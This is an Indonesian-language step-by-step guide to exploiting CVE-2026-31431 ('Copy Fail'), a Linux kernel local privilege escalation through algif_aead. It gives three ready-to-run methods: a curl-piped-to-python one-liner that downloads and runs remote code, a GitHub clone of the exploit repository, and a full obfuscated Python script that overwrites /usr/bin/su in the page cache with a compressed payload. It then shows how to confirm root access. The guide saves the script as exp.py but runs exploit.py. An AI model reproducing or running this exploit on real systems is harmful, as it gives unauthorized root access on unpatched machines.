# CVE-2026-31431 — Copy Fail (CVE-2026-31431) : Analysis & Lab Guide

> **Panduan praktis** untuk melakukan identifikasi kerentanan, simulasi eksploitasi (*Local Privilege Escalation*), dan verifikasi pasca-eksploitasi pada kernel Linux yang terdampak celah **Copy Fail** (`algif_aead` page cache overwrite).

---

## 🗂️ Daftar Isi

- [1. Identifikasi Sistem (Pre-Exploit Check)](#1-identifikasi-sistem-pre-exploit-check)
- [2. Metode Eksploitasi (The Exploit)](#2-metode-eksploitasi-the-exploit)
  - [Metode A — One-Liner (In-Memory)](#metode-a--one-liner-eksekusi-in-memory-langsung)
  - [Metode B — Clone Repositori GitHub](#metode-b--kloning-repositori-resmi-dari-github)
  - [Metode C — Buat Skrip Manual](#metode-c--pembuatan-skrip-manual)
- [3. Verifikasi Pasca-Eksploitasi](#3-verifikasi-pasca-eksploitasi-poc-check)

---

## 1. Identifikasi Sistem (Pre-Exploit Check)

Sebelum menjalankan pengujian, pastikan lingkungan target memenuhi kriteria rentan.

---

### 🔍 Periksa Versi Kernel

```bash
uname -r
```

> **Penjelasan:** Mengecek versi kernel Linux untuk memastikan apakah masuk dalam lini yang rentan.

> [!NOTE]
> Lini kernel LTS Ubuntu `5.15.0-XXX` dengan versi **di bawah `5.15.0-179`** berpotensi rentan (*possible vulnerable*).
> Versi **179 ke atas** umumnya sudah mendapatkan backport patch resmi dari vendor.

---

### 🐍 Periksa Ketersediaan Python

```bash
python3 --version
which python3
```

> **Penjelasan:** Memastikan versi Python 3 terinstal dan mengecek jalur absolut direktori penyimpanannya.

---

## 2. Metode Eksploitasi (The Exploit)

Pilih salah satu dari tiga metode berikut untuk mengeksekusi PoC **Copy Fail**:

| # | Metode | Keterangan |
|---|--------|------------|
| A | One-Liner | Eksekusi in-memory, tanpa menyimpan file ke disk |
| B | Clone GitHub | Unduh repo resmi, analisis & jalankan secara lokal |
| C | Skrip Manual | Tulis ulang PoC secara mandiri dari awal |

---

### Metode A — One-Liner (Eksekusi In-Memory Langsung)

Cara tercepat: unduh, eksekusi langsung ke memori, dan picu eskalasi privasi.

```bash
curl https://copy.fail/exp | python3 && su
```

> **Penjelasan:** Mengunduh skrip dari web, mengalirkannya langsung ke memori via Python tanpa disimpan ke disk, lalu memicu perintah `su`.

---

### Metode B — Kloning Repositori Resmi dari GitHub

Mengunduh seluruh isi repositori resmi milik **Theori** untuk dianalisis dan dijalankan secara lokal.

```bash
git clone https://github.com/theori-io/copy-fail-CVE-2026-31431.git
cd copy-fail-CVE-2026-31431
python3 copy_fail_exp.py
su
```

> **Penjelasan:** Menyalin repo resmi, masuk ke foldernya, menjalankan skrip secara lokal, lalu melakukan eskalasi via `su`.

---

### Metode C — Pembuatan Skrip Manual

Jika Anda ingin menulis ulang skrip PoC secara mandiri.

**Langkah 1** — Buat file baru:

```bash
cat << 'EOF' > exp.py
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
EOF
```

**Langkah 2** — Simpan file (`Enter`), lalu jalankan:

```bash
python3 exploit.py
su
```

> **Penjelasan:** Menjalankan skrip manual yang telah dibuat, kemudian memicu biner `su` untuk menyelesaikan eskalasi privasi.

---

## 3. Verifikasi Pasca-Eksploitasi (PoC Check)

Setelah skrip berhasil dieksekusi dan perintah `su` dijalankan, verifikasi hak akses sistem menggunakan perintah berikut:

---

### ✅ Cek ID Pengguna

```bash
id
```

> **Penjelasan:** Menampilkan nomor identitas pengguna aktif beserta grupnya.
>
> 🎯 **Indikator berhasil:** `uid=0(root)`

---

### ✅ Cek Identitas Akun Saat Ini

```bash
whoami
```

> **Penjelasan:** Menampilkan nama akun sistem yang sedang aktif saat ini.
>
> 🎯 **Indikator berhasil:** `root`

---

> [!IMPORTANT]
> **Indikator Keberhasilan:** Jika sistem rentan, terminal akan langsung merespons dengan `uid=0(root)` dan `whoami` menampilkan `root`.

---

> [!WARNING]
> Dokumen ini dibuat untuk keperluan **authorized penetration testing**, **security research**, dan **lab environment** saja.
> Penggunaan di luar lingkungan yang diizinkan merupakan pelanggaran hukum.
